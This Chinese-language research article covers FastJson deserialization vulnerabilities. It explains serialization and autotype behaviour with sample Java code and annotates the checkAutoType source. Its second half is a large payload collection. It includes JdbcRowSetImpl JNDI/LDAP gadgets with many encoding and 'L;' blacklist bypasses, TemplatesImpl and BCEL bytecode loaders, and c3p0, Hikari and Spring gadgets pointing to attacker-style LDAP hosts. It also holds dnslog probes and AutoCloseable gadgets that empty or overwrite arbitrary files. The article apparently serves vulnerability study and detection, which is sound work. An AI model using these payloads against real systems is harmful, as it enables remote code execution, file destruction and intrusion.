# FastJson漏洞原理与检测、利用方式研究
# FastJson简介
FastJson 是阿⾥巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，⽀持将 Java Bean 序列
化为 JSON 字符串，也可以从JSON字符串反序列化到 Java Bean。
## FastJson序列化
```java
public class TestBean {
    public String publicField;
    private String privateField;
    private Flag flag;

    public TestBean(){
        System.out.println("TestBean constructor has called.");
        this.publicField = "publicField";
        this.privateField = "privateField";
        this.flag = new Flag();
    }

    public String getPublicField() {
        System.out.println("getPublicField has called.");
        return publicField;
    }

    public void setPublicField(String publicField) {
        System.out.println("setPublicField has called.");
        this.publicField = publicField;
    }

    public String getPrivateField() {
        System.out.println("getPrivateField has called.");
        return privateField;
    }

    public void setPrivateField(String privateField) {
        System.out.println("setPrivateField has called.");
        this.privateField = privateField;
    }

    public Flag getFlag() {
        System.out.println("getFlag has called.");
        return flag;
    }

    public void setFlag(Flag flag) {
        System.out.println("setFlag has called.");
        this.flag = flag;
    }
    @Override
    public String toString() {
        return "TestBean{" +
                "publicField='" + publicField + '\'' +
                ", privateField=" + privateField +
                ", flag=" + flag +
                '}';
    }
}

public class Flag {
    private String value;
    public Flag(){
        System.out.println("Flag constructor has called.");
        this.value = "flag{ctftest}";
    }
    public String getValue() {
        System.out.println("flag getValue has called.");
        return value;
    }
    public void setValue(String value) {
        System.out.println("flag setValue has called.");
        this.value = value;
    }
}
```
### **⾮⾃省调用toJSONString进行序列化**
```java
TestBean testBean = new TestBean();
String json1 = JSON.toJSONString(testBean);
System.out.println(json1);
```
```
// 输出：
TestBean constructor has called.
Flag constructor has called.
getFlag has called.
flag getValue has called.
getPrivateField has called.
getPublicField has called.
{"flag":{"value":"flag{ctftest}"},"privateField":"privateField","publicField":"publicField"}
```
构造⽅法并不是在序列化时触发的，⽽是在创建对象时触发的，除此之外，可以通过调试简单发现正常的Fastjson序列化会触发每⼀个属性的 get ⽅法。

### **⾃省调用toJSONString进行序列化**
```java
String json2 = JSON.toJSONString(testBean, SerializerFeature.WriteClassName);
System.out.println(json2);
```
```
// 输出：
getFlag has called.
flag getValue has called.
getPrivateField has called.
getPublicField has called.
{"@type":"com.dds.test.TestBean","flag":{"value":"flag{ctftest}"},"privateField":"privateField","publicField":"publicField"}
```
JSON 字符串中新增 @type 字段名，⽤来表明指定反序列化的⽬标对象类型为 TestBean。JSON 标准是不⽀持⾃省的，也就是说根据 JSON ⽂本，不知道它包含的对象的类型。FastJson ⽀持⾃省，在序列化时传⼊类型信息 SerializerFeature.WriteClassName ，可以得到能表明对象类型的 JSON ⽂本。FastJson 的漏洞就是由于这个功能引起的。
## FastJson反序列化
### **⾮⾃省调用反序列化**
```java
String serJson = "{\"flag\":{\"value\":\"flag{ctftest}\"},\"privateField\":\"privateField\",\"publicField\":\"publicField\"}";
System.out.printf("parseObject second has done => %s\n","yes");
System.out.println(JSON.parseObject(serJson,TestBean.class));
```
```
// 输出：
parseObject second has done => yes
TestBean constructor has called.
Flag constructor has called.
Flag constructor has called.
flag setValue has called.
setFlag has called.
setPrivateField has called.
setPublicField has called.
TestBean{publicField='publicField', privateField=privateField, flag=com.dds.bean.Flag@5ba23b66}
```
在反序列化时，调⽤了全部的setter，没有set函数的成员则为NULL。
### **⾃省调用反序列化**
```java
// parseObject方式
String serJson2 = "{\"@type\":\"com.dds.test.TestBean\",\"flag\":{\"@type\":\"com.dds.bean.Flag\",\"value\":\"flag{ctftest}\"},\"privateField\":\"privateField\",\"publicField\":\"publicField\"}";
System.out.printf("parseObject second has done => %s\n","yes");
System.out.println(JSON.parseObject(serJson2));
```
```
// 输出：
parseObject has done => yes
TestBean constructor has called.
Flag constructor has called.
Flag constructor has called.
flag setValue has called.
setFlag has called.
setPrivateField has called.
setPublicField has called.
getFlag has called.
getPrivateField has called.
getPublicField has called.
flag getValue has called.
{"flag":{"value":"flag{ctftest}"},"privateField":"privateField","publicField":"publicField"}
```
调⽤了全部的 getter ⽅法， setter ⽅法全部调⽤。
```java
// parse方式
String serJson2 = "{\"@type\":\"com.dds.test.TestBean\",\"flag\":{\"@type\":\"com.dds.bean.Flag\",\"value\":\"flag{ctftest}\"},\"privateField\":\"privateField\",\"publicField\":\"publicField\"}";
System.out.printf("parseObject second has done => %s\n","yes");
System.out.println(JSON.parse(serJson2));
```
```
// 输出：
Parse had done => yes
TestBean constructor has called.
Flag constructor has called.
Flag constructor has called.
flag setValue has called.
setFlag has called.
setPrivateField has called.
setPublicField has called.
TestBean{publicField='publicField', privateField=privateField, flag=com.dds.bean.Flag@30c7da1e, noSetFlag = null}
```
反序列化时的 getter、setter调⽤情况和⾮⾃省的⼀样。

# FastJson checkAutoType源码分析

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
        if (typeName == null) {
            return null;
        }
        //在1.2.68之后的版本，提供了AutoTypeCheckHandler扩展，可以自定义类接管autoType, 通过ParserConfig#addAutoTypeCheckHandler方法注册。
        if (autoTypeCheckHandlers != null) {
            for (AutoTypeCheckHandler h : autoTypeCheckHandlers) {
                Class<?> type = h.handler(typeName, expectClass, features);
                if (type != null) {
                    return type;
                }
            }
        }
        // SafeMode 在枚举内中的索引24，1左移24位，
        final int safeModeMask = Feature.SafeMode.mask;
        /**多方面获取safeMode,ParserConfig设置了safeMode=true 或者 反序列化的时候传递了Feature.SafeMode或者DEFAULT_PARSER_FEATURE中设置SafeMode
        Feature是个枚举类型，1左移feature的索引，表示这个feature设置了
        注意：使用ParserConfig.getGlobalInstance().setSafeMode(true);是全局生效的
            如果ParserConfig未设置SafeMode，通过Feature.SafeMode解析只是调用的地方有效
        **/
        boolean safeMode = this.safeMode
                || (features & safeModeMask) != 0
                || (JSON.DEFAULT_PARSER_FEATURE & safeModeMask) != 0;
        if (safeMode) { // safeMode = true, 直接报错返回，禁用AutoType
            throw new JSONException("safeMode not support autoType : " + typeName);
        }
        // 如果未设置safeMode则进行以往的checkAutoType判断
        final boolean expectClassFlag;
        if (expectClass == null) {
            expectClassFlag = false;
        } else {
            if (expectClass == Object.class
                    || expectClass == Serializable.class
                    || expectClass == Cloneable.class
                    || expectClass == Closeable.class
                    || expectClass == EventListener.class
                    || expectClass == Iterable.class
                    || expectClass == Collection.class
                    ) {
                expectClassFlag = false;
            } else {
                expectClassFlag = true;
            }
        }

        String className = typeName.replace('$', '.');
        Class<?> clazz;

        final long BASIC = 0xcbf29ce484222325L;
        final long PRIME = 0x100000001b3L;
        // 1.2.43增加检测，修复类名带"["的绕过，改成了[开头就抛异常。
        //{"rand1":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true]}}
        final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
        if (h1 == 0xaf64164c86024f1aL) { // [
            throw new JSONException("autoType is not support. " + typeName);
        }
        // 1.2.41增加检测，修复类名带"Lxx;"的绕过
        //{"rand1": {"@type": "Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName": "ldap://localhost:1389/Object","autoCommit": true}}
        // 1.2.42增加检测，修复类名带"LL"的绕过
        //{"rand1": {"@type": "LLcom.sun.rowset.JdbcRowSetImpl;","dataSourceName": "ldap://localhost:1389/Object","autoCommit": true}}
        //此处判断;结尾也抛异常，删除了之前的L开头、;结尾、LL开头的判断。
        if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) {
            throw new JSONException("autoType is not support. " + typeName);
        }
    
        final long h3 = (((((BASIC ^ className.charAt(0))
                * PRIME)
                ^ className.charAt(1))
                * PRIME)
                ^ className.charAt(2))
                * PRIME;

        long fullHash = TypeUtils.fnv1a_64(className);
        // 计算哈希值进⾏内部⽩名单匹配
        boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,  fullHash) >= 0;
        // 计算哈希值进⾏内部⿊名单匹配
        if (internalDenyHashCodes != null) {
            long hash = h3;
            for (int i = 3; i < className.length(); ++i) {
                hash ^= className.charAt(i);
                hash *= PRIME;
                if (Arrays.binarySearch(internalDenyHashCodes, hash) >= 0) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
        }
        /** ⾮内部⽩名单且开启autoTypeSupport或者是期望类的，进⾏hash校验⽩名单acceptHashCodes、⿊
            名单denyHashCodes。如果在acceptHashCodes内则进⾏加载( defaultClassLoader),在⿊名单内则抛
            出 autoType is not support
        **/
        if ((!internalWhite) && (autoTypeSupport || expectClassFlag)) {
            long hash = h3;
            for (int i = 3; i < className.length(); ++i) {
                hash ^= className.charAt(i);
                hash *= PRIME;
                if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
                    if (clazz != null) {
                        return clazz;
                    }
                }
                if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                    if (Arrays.binarySearch(acceptHashCodes, fullHash) >= 0) {
                        continue;
                    }

                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
        }

        clazz = TypeUtils.getClassFromMapping(typeName);

        if (clazz == null) {
            clazz = deserializers.findClass(typeName);
        }

        if (clazz == null) {
            clazz = typeMapping.get(typeName);
        }

        if (internalWhite) {
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
        }

        if (clazz != null) {
            if (expectClass != null
                    && clazz != java.util.HashMap.class
                    && !expectClass.isAssignableFrom(clazz)) {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }

            return clazz;
        }
        // 未开启autoTypeSupport的情况下，对比黑名单、白名单
        if (!autoTypeSupport) {
            long hash = h3;
            for (int i = 3; i < className.length(); ++i) {
                char c = className.charAt(i);
                hash ^= c;
                hash *= PRIME;

                if (Arrays.binarySearch(denyHashCodes, hash) >= 0) {
                    throw new JSONException("autoType is not support. " + typeName);
                }

                // white list
                if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);

                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }

                    return clazz;
                }
            }
        }

        boolean jsonType = false;
        InputStream is = null;
        try {
            String resource = typeName.replace('.', '/') + ".class";
            if (defaultClassLoader != null) {
                is = defaultClassLoader.getResourceAsStream(resource);
            } else {
                is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
            }
            if (is != null) {
                ClassReader classReader = new ClassReader(is, true);
                TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
                classReader.accept(visitor);
                jsonType = visitor.hasJsonType();
            }
        } catch (Exception e) {
            // skip
        } finally {
            IOUtils.close(is);
        }

        final int mask = Feature.SupportAutoType.mask;
        boolean autoTypeSupport = this.autoTypeSupport
                || (features & mask) != 0
                || (JSON.DEFAULT_PARSER_FEATURE & mask) != 0;

        if (autoTypeSupport || jsonType || expectClassFlag) {
            boolean cacheClass = autoTypeSupport || jsonType;
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
        }

        if (clazz != null) {
            if (jsonType) {
                TypeUtils.addMapping(typeName, clazz);
                return clazz;
            }

            if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                    || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                    || javax.sql.RowSet.class.isAssignableFrom(clazz) //
                    ) {
                throw new JSONException("autoType is not support. " + typeName);
            }

            if (expectClass != null) {
                if (expectClass.isAssignableFrom(clazz)) {
                    TypeUtils.addMapping(typeName, clazz);
                    return clazz;
                } else {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
            }

            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);
            if (beanInfo.creatorConstructor != null && autoTypeSupport) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }

        if (!autoTypeSupport) {
            throw new JSONException("autoType is not support. " + typeName);
        }

        if (clazz != null) {
            TypeUtils.addMapping(typeName, clazz);
        }

        return clazz;
    }
```
# FastJson Payload
JdbcRowSetImpl
```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://127.0.0.1:23457/Calc",
    "autoCommit": true
}
```
编码绕过
```json
{"rand1": {"@type": "Lcom.sun.rowset.JdbcRowSetImpl;", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}

{"rand1": {"@type": "LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}

{"rand1": {"@type": "\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}

{"rand1": {"@type": "\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}

{"rand1": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "rand2": {"rand1": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}}

{"rand1": {"@type": "\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}

{"rand1": {"@type": "\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}

{"rand1": {"@type": "\u004c\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b\u003b", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}

{"rand1": {"@type": "\x4c\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b\x3b", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}

{"rand1": {"@type": "\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073", "val": "com.sun.rowset.JdbcRowSetImpl"}, "rand2": {"rand1": {"@type": "\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}}

{"rand1": {"@type": "\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73", "val": "com.sun.rowset.JdbcRowSetImpl"}, "rand2": {"rand1": {"@type": "\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}}
```
TemplatesImpl
```json
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["yv66vgA...k="],
    '_name': 'su18',
    '_tfactory': {},
    "_outputProperties": {},
}
```
JndiDataSourceFactory
```json
{
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "ldap://127.0.0.1:23457/Calc"
    }
}
```
SimpleJndiBeanFactory
```json
{
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "ldap://127.0.0.1:23457/Calc",
    "propertyPath": "su18",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://127.0.0.1:23457/Calc"
      ]
    }
}
```
DefaultBeanFactoryPointcutAdvisor
```json
{
  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
   "beanFactory": {
     "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
     "shareableResources": [
       "ldap://127.0.0.1:23457/Calc"
     ]
   },
   "adviceBeanName": "ldap://127.0.0.1:23457/Calc"
},
{
   "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
}
```
WrapperConnectionPoolDataSource
```json
{
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:aced000...6f;"
}
```
JndiRefForwardingDataSource
```json
{
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "ldap://127.0.0.1:23457/Calc",
    "loginTimeout": 0
}
```
InetAddress
```json
{
    "@type": "java.net.InetAddress",
    "val": "http://dnslog.com"
}
```
Inet6Address
```json
{
    "@type": "java.net.Inet6Address",
    "val": "http://dnslog.com"
}
```
URL
```json
{
    "@type": "java.net.URL",
    "val": "http://dnslog.com"
}
```
JSONObject
```json
{
    "@type": "com.alibaba.fastjson.JSONObject",
    {
        "@type": "java.net.URL",
        "val": "http://dnslog.com"
    }
}""
}
```
一些畸形payload，不过依然可以触发dnslog：
```json
{"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}

{"rand7":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}

{"rand8":Set[{"@type":"java.net.URL","val":"http://dnslog"}

{"rand9":{"@type":"java.net.URL","val":"http://dnslog"}:0
```
URLReader
```json
{
    "poc": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.alibaba.fastjson.JSONReader",
        "reader": {
            "@type": "jdk.nashorn.api.scripting.URLReader",
            "url": "http://127.0.0.1:9999"
        }
    }
}
```
BasicDataSource
```json
{
  "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
  "driverClassName" : "$$BCEL$$$l$8b$I$A$A$A$A...",
  "driverClassLoader" :
  {
    "@type":"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;"
  }
}
```
JndiConverter
```json
{
    "@type": "org.apache.xbean.propertyeditor.JndiConverter",
    "AsText": "ldap://127.0.0.1:9999/Calc"
}
```
JtaTransactionConfig
```json
{
    "@type": "com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
    "properties": {
        "@type": "java.util.Properties",
        "UserTransaction": "ldap://127.0.0.1:9999/Calc"
    }
}
```
JndiObjectFactory
```json
{
    "@type": "org.apache.shiro.jndi.JndiObjectFactory",
    "resourceName": "ldap://127.0.0.1:9999/Calc"
}
```
AnterosDBCPConfig
```json
{
    "@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
    "metricRegistry": "ldap://127.0.0.1:9999/Calc"
}
```
AnterosDBCPConfig2
```json
{
    "@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
    "healthCheckRegistry": "ldap://127.0.0.1:9999/Calc"
}
```
CacheJndiTmLookup
```json
{
    "@type": "org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
    "jndiNames": "ldap://127.0.0.1:9999/Calc"
}
```
BasicDataSource
```json
{
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassName": "true",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A"
}
```
HikariConfig
```json
{
    "@type": "com.zaxxer.hikari.HikariConfig",
    "metricRegistry": "ldap://127.0.0.1:9999/Calc"
}
```
HikariConfig
```json
{
    "@type": "com.zaxxer.hikari.HikariConfig",
    "healthCheckRegistry": "ldap://127.0.0.1:9999/Calc"
}
```
HikariConfig
```json
{
    "@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
    "metricRegistry": "ldap://127.0.0.1:9999/Calc"
}
```
HikariConfig
```json
{
    "@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
    "healthCheckRegistry": "ldap://127.0.0.1:9999/Calc"
}
```
SessionBeanProvider
```json
{
    "@type": "org.apache.commons.proxy.provider.remoting.SessionBeanProvider",
    "jndiName": "ldap://127.0.0.1:9999/Calc",
    "Object": "su18"
}
```
JMSContentInterceptor
```json
{
    "@type": "org.apache.cocoon.components.slide.impl.JMSContentInterceptor",
    "parameters": {
        "@type": "java.util.Hashtable",
        "java.naming.factory.initial": "com.sun.jndi.rmi.registry.RegistryContextFactory",
        "topic-factory": "ldap://127.0.0.1:9999/Calc"
    },
    "namespace": ""
}
```
ContextClassLoaderSwitcher
```json
{
    "@type": "org.jboss.util.loading.ContextClassLoaderSwitcher",
    "contextClassLoader": {
        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "a": {
        "@type": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A"
    }
}
```
OracleManagedConnectionFactory
```json
{
    "@type": "oracle.jdbc.connector.OracleManagedConnectionFactory",
    "xaDataSourceName": "ldap://127.0.0.1:9999/Calc"
}
```
JNDIConfiguration
```json
copy{
    "@type": "org.apache.commons.configuration.JNDIConfiguration",
    "prefix": "ldap://127.0.0.1:9999/Calc"
}
```
AutoCloseable 清空指定文件
```json
{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileOutputStream",
    "file":"/tmp/nonexist",
    "append":false
}
```
AutoCloseable 清空指定文件
```json
{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileWriter",
    "file":"/tmp/nonexist",
    "append":false
}
```
AutoCloseable 任意文件写入
```json
{
    "stream":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"java.io.FileOutputStream",
        "file":"/tmp/nonexist",
        "append":false
    },
    "writer":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.apache.solr.common.util.FastOutputStream",
        "tempBuffer":"SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=",
        "sink":
        {
            "$ref":"$.stream"
        },
        "start":38
    },
    "close":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.iq80.snappy.SnappyOutputStream",
        "out":
        {
            "$ref":"$.writer"
        }
    }
}

{
    'stream':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.apache.tools.ant.util.LazyFileOutputStream',
        'file':'/tmp/nonexist',
        'append':false
    },
    'writer':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.apache.solr.common.util.FastOutputStream',
        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
        'sink':
        {
            '$ref':'$.stream'
        },
        'start':38
    },
    'close':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.iq80.snappy.SnappyOutputStream',
        'out':
        {
            '$ref':'$.writer'
        }
    }
}

{
    '@type':"java.lang.AutoCloseable",
    '@type':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '@type':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '@type':'java.io.FileOutputStream',
           'file':'dst',
           'append':false
        },
        'infl':
        {
            'input':
            {
                'array':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',
                'limit':22
            }
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}
````
AutoCloseable 任意文件写入
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream",
    "out": {
        "@type": "java.io.FileOutputStream",
        "file": "/path/to/target"
    },
    "parameters": {
        "@type": "org.apache.commons.compress.compressors.gzip.GzipParameters",
        "filename": "filecontent"
    }
}
```
# 总结

https://zonghaishang.github.io/2018/09/30/Fastjson%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90-%E8%AF%8D%E6%B3%95%E5%92%8C%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90-(%E4%B8%89)-%E9%92%88%E5%AF%B9%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E8%A7%A3%E6%9E%90/

https://ananaskr.github.io/2020/05/20/fastjson-introduction/

https://paper.seebug.org/1192/

https://paper.seebug.org/994/

https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/serializer/serializerWriter_part1.html

http://scz.617.cn:8/web/202008111715.txt